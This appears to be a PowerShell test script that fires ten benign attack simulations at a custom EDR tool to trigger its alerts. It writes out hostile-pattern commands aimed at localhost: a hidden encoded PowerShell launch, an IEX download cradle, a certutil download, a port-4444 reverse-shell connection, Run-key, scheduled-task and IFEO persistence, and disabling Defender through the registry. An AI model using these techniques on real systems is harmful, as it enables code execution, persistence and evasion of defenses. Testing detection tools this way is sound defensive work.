##############################################################################
#  CUSTOM EDR - MEGA TEST (ALL PHASES)
#  Runs all attack simulations in sequence for a full showcase demo.
#  Safe to run - no real malware, all actions cleaned up.
#
#  USAGE: .\attack_sim_mega_test.ps1
#  REQUIRES: EDR running in another terminal (python run_edr.py)
##############################################################################

#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

function Show-Header {
    param([string]$Title, [int]$Step, [int]$Total)
    Write-Host ""
    Write-Host "  [$Step/$Total] $Title" -ForegroundColor Cyan
    Write-Host "  -------------------------------------------------------" -ForegroundColor DarkCyan
}

Write-Host ""
Write-Host "  =======================================================" -ForegroundColor Magenta
Write-Host "   CUSTOM EDR - FULL ATTACK SIMULATION SHOWCASE          " -ForegroundColor Magenta
Write-Host "   All safe/benign. Everything cleaned up afterward.     " -ForegroundColor Magenta
Write-Host "  =======================================================" -ForegroundColor Magenta
Write-Host ""
Write-Host "  Make sure your EDR is running:  python run_edr.py" -ForegroundColor Yellow
Write-Host "  Dashboard:                      http://127.0.0.1:5000" -ForegroundColor Yellow
Write-Host ""

Read-Host "  Press Enter to start the simulation..."
$start_time = Get-Date
$total_steps = 10

# --- 1. Encoded PowerShell ---
Show-Header "Encoded PowerShell Command" 1 $total_steps
$cmd = "Write-Host 'MEGA_TEST: Encoded PS executed'; Start-Sleep 1"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
Start-Process powershell.exe -ArgumentList "-NoP -NonI -W Hidden -Enc $enc" -Wait
Write-Host "  OK - Fired" -ForegroundColor Green
Start-Sleep 2

# --- 2. Download Cradle ---
Show-Header "PowerShell Download Cradle" 2 $total_steps
$cradle = "try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9999/p.ps1') } catch {}"
$cradle_enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cradle))
Start-Process powershell.exe -ArgumentList "-NoP -Enc $cradle_enc" -Wait
Write-Host "  OK - Fired" -ForegroundColor Green
Start-Sleep 2

# --- 3. AMSI Bypass Pattern ---
Show-Header "AMSI Bypass Attempt" 3 $total_steps
$amsi = "Write-Host 'AmsiUtils test'; Write-Host 'amsiInitFailed check'"
$amsi_enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($amsi))
Start-Process powershell.exe -ArgumentList "-Enc $amsi_enc" -Wait
Write-Host "  OK - Fired" -ForegroundColor Green
Start-Sleep 2

# --- 4. Registry Run Key ---
Show-Header "Registry Run Key Persistence" 4 $total_steps
$run_path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $run_path -Name "MEGA_TEST_Persist" -Value "C:\Users\Public\fake_backdoor.exe"
Start-Sleep 1
Remove-ItemProperty -Path $run_path -Name "MEGA_TEST_Persist" -ErrorAction SilentlyContinue
Write-Host "  OK - Fired + cleaned up" -ForegroundColor Green
Start-Sleep 2

# --- 5. Scheduled Task ---
Show-Header "Scheduled Task Creation" 5 $total_steps
cmd.exe /c "schtasks /create /tn ""MEGA_TEST_Task"" /tr ""calc.exe"" /sc onlogon /ru SYSTEM /f" 2>&1 | Out-Null
Start-Sleep 1
cmd.exe /c "schtasks /delete /tn ""MEGA_TEST_Task"" /f" 2>&1 | Out-Null
Write-Host "  OK - Fired + cleaned up" -ForegroundColor Green
Start-Sleep 2

# --- 6. certutil LOLBin ---
Show-Header "certutil LOLBin Network Abuse" 6 $total_steps
Start-Process "cmd.exe" -ArgumentList "/c certutil.exe -urlcache -split -f http://127.0.0.1:9999/test.exe nul" -Wait
Write-Host "  OK - Fired" -ForegroundColor Green
Start-Sleep 2

# --- 7. PowerShell to Port 4444 (Reverse Shell Simulation) ---
Show-Header "Reverse Shell Simulation (Port 4444)" 7 $total_steps
$rs = 'try { $c = New-Object System.Net.Sockets.TcpClient; $c.Connect("127.0.0.1", 4444) } catch {} finally { if ($c) { $c.Close() } }'
$rs_enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($rs))
Start-Process powershell.exe -ArgumentList "-NoP -NonI -Enc $rs_enc" -Wait
Write-Host "  OK - Fired" -ForegroundColor Green
Start-Sleep 2

# --- 8. IFEO Debugger ---
Show-Header "IFEO Debugger Hijack" 8 $total_steps
$ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mega_test_edr.exe"
New-Item -Path $ifeo -Force | Out-Null
Set-ItemProperty -Path $ifeo -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -ErrorAction SilentlyContinue
Start-Sleep 1
Remove-Item -Path $ifeo -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "  OK - Fired + cleaned up" -ForegroundColor Green
Start-Sleep 2

# --- 9. Defender Registry Key ---
Show-Header "Windows Defender Disable Attempt" 9 $total_steps
$defenderKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$defenderSet = $false
try {
    Set-ItemProperty -Path $defenderKey -Name "DisableAntiSpyware" -Value 1 -Type DWord -ErrorAction Stop
    $defenderSet = $true
} catch {
    Write-Host "  ! Skipped (no admin rights to this key)" -ForegroundColor Yellow
}
if ($defenderSet) {
    Start-Sleep 1
    Set-ItemProperty -Path $defenderKey -Name "DisableAntiSpyware" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    Write-Host "  OK - Fired + reverted" -ForegroundColor Green
}
Start-Sleep 2

# --- 10. DNS Query Simulation ---
Show-Header "Suspicious DNS Query" 10 $total_steps
$dns_cmd = "Resolve-DnsName -Name 'c2-simulator.edr-test.local' -ErrorAction SilentlyContinue"
$dns_enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($dns_cmd))
Start-Process powershell.exe -ArgumentList "-NoP -Enc $dns_enc" -Wait
Write-Host "  OK - Fired" -ForegroundColor Green

# --- FINAL REPORT ---
$elapsed = (Get-Date) - $start_time
$secs = [math]::Round($elapsed.TotalSeconds, 1)

Write-Host ""
Write-Host "  =======================================================" -ForegroundColor Green
Write-Host "   MEGA TEST COMPLETE                                     " -ForegroundColor Green
Write-Host "  -------------------------------------------------------" -ForegroundColor Green
Write-Host "   Duration:    $secs seconds" -ForegroundColor Green
Write-Host "   Simulations: 10 fired" -ForegroundColor Green
Write-Host "  -------------------------------------------------------" -ForegroundColor Green
Write-Host "   Expected alerts:" -ForegroundColor Green
Write-Host "     PS001, PS002, PS003  (PowerShell)" -ForegroundColor Green
Write-Host "     PER001, PER002, PER006, PER007  (Persistence)" -ForegroundColor Green
Write-Host "     NET001, NET002, NET005  (Network)" -ForegroundColor Green
Write-Host "  -------------------------------------------------------" -ForegroundColor Green
Write-Host "   View results: http://127.0.0.1:5000" -ForegroundColor Green
Write-Host "  =======================================================" -ForegroundColor Green
Write-Host ""
